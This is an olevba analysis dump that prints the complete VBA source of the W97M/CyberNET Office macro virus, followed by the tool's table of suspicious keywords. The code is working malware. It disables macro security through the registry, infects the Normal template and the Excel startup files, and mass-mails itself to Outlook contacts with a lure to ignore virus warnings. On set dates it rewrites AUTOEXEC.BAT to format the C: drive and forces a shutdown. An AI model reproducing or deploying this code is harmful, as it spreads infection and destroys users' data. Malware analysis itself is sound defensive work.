olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
'W97M/CyberNET (C)2000 - Indonesia By AnomOke! "I'm NOT Responsible For Any Damage That Posible Cause By My Virus...!!!"
Application.EnableCancelKey = wdCancelDisabled: Options.SaveInterval = 1: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Application.DisplayRecentFiles = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else: Options.VirusProtection _
= False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: End If
Call HH9466
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
Randomize: For HK184 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next HK184
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Call VC6648: End If
MN5776 = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
RQ8515 = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.Description <> "CyberNET" Or Left(ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set BR4082 = ActiveDocument.VBProject.VBComponents
Call NV6680(BR4082)
BR4082(1).CodeModule. _
AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, RQ8515 - 19))
ActiveDocument.VBProject.Description = "CyberNET"
End If
If NormalTemplate.VBProject.Description <> "CyberNET" Or Left(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set BR4082 = NormalTemplate.VBProject.VBComponents
Call NV6680(BR4082)
Randomize
Dim UR50(1 To 37) As String
UR50(1) = "RP6236"
UR50(2) = "JI3255"
UR50(3) = "FR3570"
UR50(4) = "HH8039"
UR50(5) = "JT9846"
UR50(6) = "MN5776"
UR50(7) = "RQ8515"
UR50(8) = "BR4082"
UR50(9) = "JT8173"
UR50(10) = "LK8445"
UR50(11) = "EE7111"
UR50(12) = "NU6972"
UR50(13) = "HH9466"
UR50(14) = "RK5344"
UR50(15) = "AJ8871"
UR50(16) = "MU2056"
UR50(17) = "QH442"
UR50(18) = "CH2979"
UR50(19) = "AD5532"
UR50(20) = "QF692"
UR50(21) = "NV6680"
UR50(22) = "KE184"
UR50(23) = "GC2158"
UR50(24) = "HK184"
UR50(25) = "CR1726"
UR50(26) = "BG8413"
UR50(27) = "CK5437"
UR50(28) = "NL9381"
UR50(29) = "OL8190"
UR50(30) = "KD1649"
UR50(31) = "BM5181"
UR50(32) = "GN4877"
UR50(33) = "VC6648"
UR50(34) = "IM6298"
UR50(35) = "UV3228"
UR50(36) = "DC5962"
UR50(37) = _
"UR50"
For NU6972 = 1 To 37
JT8173 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call JT9846(JT8173, UR50(NU6972))
Next NU6972
ActiveDocument.Saved = True
BR4082(1).CodeModule. _
AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, MN5776 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & _
"If Dialogs(80).Show <> 0 Then Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub")
BR4082(1).Name = "CK5437"
NormalTemplate.VBProject.Description = "CyberNET"
End If
Set NL9381 = CreateObject("Excel.Application")
If UCase(Dir(NL9381.Application.StartupPath + "\CyberNET.xls")) <> UCase("CYBERNET.XLS") Or Day(Now) = Minute(Now) Then
If UCase(Dir(NL9381.Application.StartupPath + "\CyberNET.xls")) = UCase("CYBERNET.XLS") Then _
SetAttr (NL9381.Application.StartupPath + "\CyberNET.xls"), vbArchive
If Dir(NL9381.Application.StartupPath + "\*.xl?") <> "" Then _
Kill (NL9381.Application.StartupPath + "\*.xl?")
Set OL8190 = NL9381.Workbooks.Add
OL8190.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 18)
OL8190.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 151, "Attachments.Add ActiveWorkbook.FullName"
OL8190.SaveAs NL9381.Application.StartupPath & "\CyberNET.xls"
NL9381.ActiveWorkbook.VBProject.Description = "CyberNET"
NL9381.ActiveWindow.Visible = False
NL9381.Workbooks("CyberNET.xls").Save
NL9381.Quit
SetAttr (NL9381.Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
If RQ8515 <> 0 And MN5776 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function JT9846(EE7111, LK8445 As String)
On Error Resume Next
Dim RP6236 As Long: Dim JI3255 As Long: Dim FR3570 As Long: Dim HH8039 As Long
With ActiveDocument.VBProject.VBComponents(1).CodeModule
RP6236 = 1: JI3255 = 1: FR3570 = .CountOfLines: HH8039 = Len(.Lines(.CountOfLines, 1))
Do While .Find(LK8445, RP6236, JI3255, FR3570, HH8039, True)
DC5962 = .Lines(RP6236, 1)
DC5962 = _
Left(DC5962, JI3255 - 1) & EE7111 & _
Mid(DC5962, HH8039)
.ReplaceLine RP6236, DC5962
RP6236 = FR3570 + 1: JI3255 = 1
FR3570 = .CountOfLines
HH8039 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function NV6680(BR4082)
Dim KE184 As Object
For Each KE184 In BR4082
KE184.CodeModule.DeleteLines 1, _
KE184.CodeModule.CountOfLines
Next KE184
End Function
Private Function HH9466()
On Error Resume Next
Dim MU2056, QH442, CH2979
Set MU2056 = CreateObject("Outlook.Application")
Set QH442 = MU2056.GetNameSpace("MAPI")
If GetSetting("Office", "CyberNET", "CyberNET") <> "(C)2000 - Indonesia By AnomOke!" Then
If MU2056 = "Outlook" Then
QH442.Logon "profile", "password"
For RK5344 = 1 To QH442.AddressLists. _
Count 'anti-heuristic for stupid Norton antivirus scanner
Set BG8413 = QH442.AddressLists(RK5344)
GC2158 = 1
Set CH2979 = MU2056.CreateItem(0)
For AJ8871 = 1 To BG8413.AddressEntries.Count
CR1726 = BG8413.AddressEntries(GC2158)
CH2979.Recipients.Add CR1726
GC2158 = _
GC2158 + 1
If GC2158 > 50 Then AJ8871 = BG8413.AddressEntries.Count
Next AJ8871
CH2979.Subject = "You've GOT Mail !!!"
CH2979.Body = "Please, saved the document after you read and don't show to anyone else. The document is also VIRUS FREE...so DISREGARD the virus protection warning !!!"
CH2979. _
Attachments.Add ActiveWorkbook.FullName
CH2979. _
Send 'anti-heuristic for stupid McAfee antivirus scanner
CR1726 = ""
Next RK5344
QH442.Logoff
End If
SaveSetting "Office", "CyberNET", "CyberNET", "(C)2000 - Indonesia By AnomOke!"
End If
End Function
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
For UV3228 = 1 To 30
IM6298 = (Chr(65 + Int(Rnd * 12))) & UV3228
Range(IM6298).AddComment
Range(IM6298).Comment.Visible = True
Range(IM6298).Comment.Text Text:="(C)2000 - CyberNET From Indonesia"
Range(IM6298).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300): Next UV3228
ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName: Call VC6648: End If
Set KD1649 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Or Day(Now) = Minute(Now) Then
Set BM5181 = GetObject(, "Word.Application")
If BM5181 = "" Then
Set BM5181 = CreateObject("Word.Application")
GN4877 = True
End If
If Dir(Application.TemplatesPath + "\Normal.dot") <> "" Then Kill (Application.TemplatesPath + "\Normal.dot")
If Dir(BM5181.Application.StartupPath + "\*.do?") <> "" Then _
Kill (BM5181.Application.StartupPath + "\*.do?")
Set BR4082 = BM5181.NormalTemplate.VBProject.VBComponents
BM5181.Options.SaveNormalPrompt = False
BR4082(1).CodeModule.InsertLines 1, "Public Sub CK5437()" & vbCr & KD1649.Lines(5, 4) & vbCr & "End Sub"
BM5181.Run "Normal.ThisDocument.CK5437"
Call NV6680(BR4082)
BR4082(1).CodeModule.InsertLines 1, KD1649. _
Lines(1, KD1649.CountOfLines - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & "If Dialogs(80).Show <> 0 Then Call Document_Close" _
& vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub"
BM5181.NormalTemplate.VBProject.Description = "CyberNET"
BR4082(1).Name = "CK5437"
BR4082(1).CodeModule.ReplaceLine 151, "Attachments.Add ActiveDocument.FullName"
Set BR4082 = Nothing
If GN4877 = True Then BM5181.Quit
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Then
Set NL9381 = CreateObject("Excel.Application")
Set OL8190 = NL9381.Workbooks.Add
OL8190.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, KD1649. _
Lines(1, KD1649.CountOfLines - 1)
OL8190.SaveAs FileName:=Application.StartupPath & "\CyberNET.xls", FileFormat:=xlNormal, AddToMru:=False
NL9381.ActiveWorkbook.VBProject.Description = "CyberNET"
NL9381.ActiveWindow.Visible = False
NL9381.Workbooks("CyberNET.xls").Save
NL9381.Quit
SetAttr (Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
End If
If Left(ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Or ActiveWorkbook.VBProject.Description <> "CyberNET" Then
Set BR4082 = ActiveWorkbook.VBProject.VBComponents
Call NV6680(BR4082)
ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, KD1649. _
Lines(1, KD1649.CountOfLines - 1)
ActiveWorkbook.VBProject.Description = "CyberNET"
End If
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("Window").Controls("Unhide...").Enabled = False
If UCase(Dir("C:\CyberNET.reg")) <> "CYBERNET.REG" Then
If Application.Version <> "9.0" Then
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close #1
Else
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Close #1
End If
End If
Shell "Regedit.exe /S C:\CyberNET.reg", vbHide
Call HH9466
Application.OnSheetActivate = "ThisWorkbook.Workbook_Deactivate"
End Sub
Private Function VC6648()
On Error Resume Next
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@ECHO OFF"
Print #1, "ECHO ###############################################################################"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO #               Vine...Vide...Vice...Moslem Power Never End...                #"
Print #1, "ECHO # I'm Really Sorry, This System Have Been Recycled By -= CyberNET =- Virus!!! #"
Print #1, "ECHO #                     Brought To You From INDONESIA...                        #"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO ###############################################################################"
Print #1, "CTTY NUL"
Print #1, "FORMAT C: /AUTOTEST /Q /U"
Close #1
Open ("C:\CONFIG.SYS") For Output As #2
Print #2, "SWITCHES=/N"
Print #2, "BREAK=OFF"
Close #2
MsgBox "Assalamualaikum Li Kulli Muslim...Moslem Power Never End..." & Chr(13) & "Nothing Can Stop << CyberNET >> Virus. Your System Has Already Infected !!!" & vbCr & "Now...I Am Outta Here...", vbCritical + vbOKOnly, "(C)2000 - CyberNET"
Shell ("RUNDLL.EXE user.exe,exitwindows"), vbHide
End Function









-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSOffice.Cybernet-a3a0acfc5bfb1c70e56675c113a66d923a6cc0cd - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CyberNET.reg        |Executable file name                         |
|IOC       |CYBERNET.REG        |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

